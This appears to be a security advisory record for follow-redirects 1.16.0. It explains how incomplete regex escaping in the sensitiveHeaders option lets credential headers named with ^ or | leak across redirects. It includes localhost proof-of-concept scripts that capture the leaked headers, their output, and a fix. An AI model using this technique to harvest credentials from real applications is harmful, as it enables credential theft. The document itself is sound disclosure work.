      "references": "- https://github.com/follow-redirects/follow-redirects/security/advisories/GHSA-8r9p-f939-6h3c\n- https://nvd.nist.gov/vuln/detail/CVE-2026-111755\n- https://github.com/follow-redirects/follow-redirects/commit/080a76d0e125b37bf81717368a61d5dc37aa56c8\n- https://github.com/follow-redirects/follow-redirects/releases/tag/v1.16.1\n- https://github.com/advisories/GHSA-8r9p-f939-6h3c",
      "created": "2026-10-20T17:53:05.000Z",
      "id": 1242605,
      "npm_advisory_id": null,
      "overview": "### Summary\nfollow-redirects 1.16.0 introduced the `sensitiveHeaders` option (the fix for CVE-2026-40895 / GHSA-r4q5-vmmm-2653), which lets an application declare extra header names that must be removed when a redirect crosses to a different host or downgrades protocol. The filter is a single case-insensitive regular expression built by concatenating the declared header names into an alternation after passing each through `escapeRegex`. `escapeRegex` escapes only a partial set of metacharacters and leaves `^`, `|`, `[`, `{`, and `}` unescaped. Header names may legitimately contain `^` and `|` (both are valid RFC 9110 token characters that Node accepts and sends), and for a declared name containing either, the generated pattern can never match the intended header. As a result, an application that adopts this option to protect a custom credential header, then follows an attacker-controlled cross-origin redirect, forwards that credential to the attacker with no error or warning, while believing it is protected. The failure is silent: the protection simply does not exist for the affected names. The built-in list (Authorization, Proxy-Authorization, Cookie) contains no metacharacters and is not affected by this defect.\n\n### Details\nThe filter is constructed once, in the `RedirectableRequest` constructor at `index.js:118-120`:\n\n```js\nthis._headerFilter = new RegExp(\"^(?:\" +\n    sensitiveHeaders.concat(options.sensitiveHeaders).map(escapeRegex).join(\"|\") +\n  \")$\", \"i\");\n```\n\n`escapeRegex` at `index.js:703-705`:\n\n```js\nfunction escapeRegex(regex) {\n  return regex.replace(/[\\]\\\\/()*+?.$]/g, \"\\\\$&\");   // escapes ] \\ / ( ) * + ? . $  -- NOT ^ | [ { }\n}\n```\n\nThe character class escapes `]`, `\\`, `/`, `(`, `)`, `*`, `+`, `?`, `.`, and `$`. It omits `^`, `|`, `[`, `{`, and `}`. Of these, Node's `http.ClientRequest` accepts `^` and `|` in header names (they are valid `tchar` values under RFC 9110) and rejects `[`, `{`, `}` with `ERR_INVALID_HTTP_TOKEN`, so `^` and `|` are the reachable vectors for a silent credential leak. Separately, although `[`, `{`, `}` cannot appear as live header names, declaring a `sensitiveHeaders` entry that contains one of them injects an unbalanced token into the alternation (for example an unterminated character class), so the filter `RegExp` throws a `SyntaxError` in the `RedirectableRequest` constructor and the request fails to start. That case is a loud request-time crash from the same incomplete-escaping root cause rather than a silent bypass, and the canonical escaper below fixes it as well.\n\nFor a declared sensitive header name containing an unescaped metacharacter, the alternation is broken in a fail-open way:\n\n- A name containing `^`, for example `X-Api^Key`, yields the alternative `X-Api^Key` inside the pattern. The `^` becomes a mid-pattern start-of-string anchor, so the alternative can never match any real header name. `test(\"X-Api^Key\")` returns `false`, and the header is not stripped.\n- A name containing `|`, for example `X-Token|Secret`, is split into two separate alternatives `X-Token` and `Secret`. The real header `X-Token|Secret` is never matched (not stripped), while unrelated headers literally named `X-Token` or `Secret` would be stripped instead.\n\nThe generated filter source, reproduced from the exact library logic, is:\n```\n^(?:Authorization|Proxy-Authorization|Cookie|X-Api^Key|X-Token|Secret|X-Control-Key)$\n```\nDirect matching results against this filter: `X-Api^Key` -> false, `X-Token|Secret` -> false, `X-Control-Key` (normal name) -> true, and the split-off `X-Token` -> true and `Secret` -> true (collateral wrong-stripping). The built-ins Authorization, Proxy-Authorization, Cookie all -> true.\n\nSecondary, related weakness (filter snapshot not refreshed after `beforeRedirect`): the filter is built once at construction and applied at `index.js:490`, which runs before the `beforeRedirect(this._options, ...)` hook and the subsequent `_sanitizeOptions` at `index.js:494-506`. Because the strip happens before the hook and `this._headerFilter` is never rebuilt, any entry a caller adds to `options.sensitiveHeaders` inside `beforeRedirect` is silently ignored. This facet is lower severity: mutating `sensitiveHeaders` inside `beforeRedirect` is not a documented usage of the option (the documented path is the request option), so it is best treated as a hardening item bundled with the escaping fix rather than an independent control bypass. It is included here because both issues undermine the same control and share a remediation.\n\nSuggested remediation: two changes close both facets.\n\n1. Escape the complete set of regular-expression metacharacters:\n```js\nfunction escapeRegex(str) { return str.replace(/[.*+?^${}()|[\\]\\\\]/g, \"\\\\$&\"); }\n```\nThis was verified to restore correct matching for all affected names while preserving the built-in matches.\n\n2. Build the filter at strip time, or rebuild it after the `beforeRedirect` hook re-sanitizes options, so entries added inside the hook take effect. For example, replace the cached `this._headerFilter` with a `this._getHeaderFilter()` that constructs the RegExp from the current `this._options.sensitiveHeaders` on each redirect.\n\nAdditionally, since header names have a strict grammar, consider validating each entry of `options.sensitiveHeaders` against the RFC 9110 token character set and throwing an explicit error on invalid names, so misconfiguration fails loudly. Add a unit test asserting that every declared name is actually matched by the generated filter; the current suite only exercises metacharacter-free names (`Sensitive-A`, `x-sensitive-b`), which is why the defect passes CI.\n\nReferences:\n- https://github.com/follow-redirects/follow-redirects/security/advisories/GHSA-r4q5-vmmm-2653\n- https://github.com/follow-redirects/follow-redirects/pull/284\n- https://github.com/follow-redirects/follow-redirects/commit/844c4d302ac963d29bdb5dc1754ec7df3d70d7f9\n\n### PoC\nEnvironment: Node.js v24.18.0 on Windows 11. Run each script from a checkout of follow-redirects at 1.16.0 so that `require(\"./index.js\")` resolves to the library under test.\n\nFacet 1, metacharacter header names, `leak.js`:\n```js\nvar followRedirects = require(\"./index.js\");\nvar http = require(\"http\");\nvar redirector = http.createServer(function (req, res) {\n  req.resume();\n  res.writeHead(302, { Location: \"http://127.0.0.1:45902/\" });   // cross-origin (different port)\n  res.end();\n});\nvar collector = http.createServer(function (req, res) {\n  res.end(JSON.stringify(req.headers));                          // attacker-controlled target\n});\nredirector.listen(45901, \"127.0.0.1\", function () {\n  collector.listen(45902, \"127.0.0.1\", function () {\n    followRedirects.http.request({\n      hostname: \"127.0.0.1\", port: 45901, path: \"/\",\n      headers: {\n        \"X-Api^Key\":      \"SECRET-LEAKED-1\",     // declared sensitive, name contains ^\n        \"X-Token|Secret\": \"SECRET-LEAKED-2\",     // declared sensitive, name contains |\n        \"X-Control-Key\":  \"SHOULD-BE-STRIPPED\",  // declared sensitive, normal name (control)\n        \"Authorization\":  \"Bearer BUILTIN-CTL\"   // built-in list (control)\n      },\n      sensitiveHeaders: [\"X-Api^Key\", \"X-Token|Secret\", \"X-Control-Key\"]\n    }, function (res) {\n      var body = \"\"; res.on(\"data\", function (c) { body += c; });\n      res.on(\"end\", function () {\n        var h = JSON.parse(body);\n        console.log(\"X-Api^Key      :\", h[\"x-api^key\"] || \"(stripped)\");\n        console.log(\"X-Token|Secret :\", h[\"x-token|secret\"] || \"(stripped)\");\n        console.log(\"X-Control-Key  :\", h[\"x-control-key\"] || \"(stripped - OK)\");\n        console.log(\"Authorization  :\", h[\"authorization\"] || \"(stripped - OK)\");\n        redirector.close(); collector.close();\n      });\n    }).end();\n  });\n});\n```\nObserved output (1.16.0):\n```\nX-Api^Key      : SECRET-LEAKED-1          <- credential LEAKED to redirect target\nX-Token|Secret : SECRET-LEAKED-2          <- credential LEAKED to redirect target\nX-Control-Key  : (stripped - OK)          <- control: option works for normal names\nAuthorization  : (stripped - OK)          <- control: built-in list works\n```\nThe two controls stripping correctly in the same run prove the strip branch executed and only the metacharacter names defeat the filter.\n\nRoot-cause and fix verification (pure regex logic, no network):\n```js\nvar builtin = [\"Authorization\", \"Proxy-Authorization\", \"Cookie\"];\nfunction escCurrent(s) { return s.replace(/[\\]\\\\/()*+?.$]/g, \"\\\\$&\"); }         // library's escaper\nfunction escFixed(s)   { return s.replace(/[.*+?^${}()|[\\]\\\\]/g, \"\\\\$&\"); }      // canonical escaper\nfunction build(esc, d) { return new RegExp(\"^(?:\" + builtin.concat(d).map(esc).join(\"|\") + \")$\", \"i\"); }\nvar declared = [\"X-Api^Key\", \"X-Token|Secret\", \"X-Control-Key\"];\nvar cur = build(escCurrent, declared), fix = build(escFixed, declared);\n[\"X-Api^Key\",\"X-Token|Secret\"].forEach(n => console.log(\"current\", n, cur.test(n)));  // both false\n[\"X-Api^Key\",\"X-Token|Secret\"].forEach(n => console.log(\"fixed  \", n, fix.test(n)));  // both true\n[\"X-Token\",\"Secret\"].forEach(n => console.log(\"collateral\", n, cur.test(n)));         // both true (wrong)\n```\nObserved: current filter returns false for both metacharacter names and true for the unrelated `X-Token` and `Secret`; the fixed filter returns true for all declared names and still true for the built-ins.\n\nReachability of the vectors:\n```\nnode -e 'var http=require(\"http\");[\"X-A^B\",\"X-A|B\",\"X-A[B\",\"X-A{B\",\"X-A}B\"].forEach(function(n){try{var r=http.request({host:\"127.0.0.1\",port:1});r.setHeader(n,\"v\");r.destroy();console.log(n,\"ACCEPTED\");}catch(e){console.log(n,\"REJECTED\",e.code);}});'\n```\nObserved: `X-A^B` and `X-A|B` ACCEPTED; `X-A[B`, `X-A{B`, `X-A}B` REJECTED with `ERR_INVALID_HTTP_TOKEN`.\n\nFacet 2, entry declared inside `beforeRedirect`, `leak2.js`:\n```js\nvar followRedirects = require(\"./index.js\");\nvar http = require(\"http\");\nvar redirector = http.createServer(function (req, res) {\n  res.writeHead(302, { Location: \"http://127.0.0.1:46202/\" }); res.end();\n});\nvar collector = http.createServer(function (req, res) { res.end(JSON.stringify(req.headers)); });\nredirector.listen(46201, \"127.0.0.1\", function () {\n  collector.listen(46202, \"127.0.0.1\", function () {\n    followRedirects.http.request({\n      hostname: \"127.0.0.1\", port: 46201, path: \"/\",\n      headers: { \"X-Late\": \"LATE-DECLARED-VALUE\" },\n      beforeRedirect: function (options) { options.sensitiveHeaders.push(\"X-Late\"); }\n    }, function (res) {\n      var body = \"\"; res.on(\"data\", function (c) { body += c; }); res.on(\"end\", function () {\n        console.log(\"X-Late forwarded to redirect target:\", JSON.parse(body)[\"x-late\"] || \"(stripped)\");\n        redirector.close(); collector.close();\n      });\n    }).end();\n  });\n});\n```\nObserved output (1.16.0): `X-Late forwarded to redirect target: LATE-DECLARED-VALUE` (the late-declared name is not stripped).\n\n### Impact\nThis is an information-disclosure vulnerability: silent failure of the `sensitiveHeaders` cross-origin stripping control for affected header names. Who is impacted: any application, or upstream library, that adopts the `sensitiveHeaders` option to protect a custom credential-bearing header whose name contains `^` or `|`, and that follows a redirect controlled or compromised by an attacker. When triggered, the declared header value (typically an API token or other bearer credential) is disclosed to the attacker-controlled destination, silently, while the application believes the header is protected. As with the array-form finding, if the redirect downgrades HTTPS to HTTP, the credential also transits in cleartext. Downstream exposure extends beyond the library: any application or wrapper that adopts the `sensitiveHeaders` option and declares a metacharacter-bearing header name inherits the same silent bypass. axios delegates redirect handling to follow-redirects (see GHSA-r4q5-vmmm-2653), so axios-based stacks are affected wherever this option reaches the library. The built-in protected headers are unaffected.",
      "reported_by": null,
      "title": "follow-redirects sensitiveHeaders regex escaping can expose credential headers",
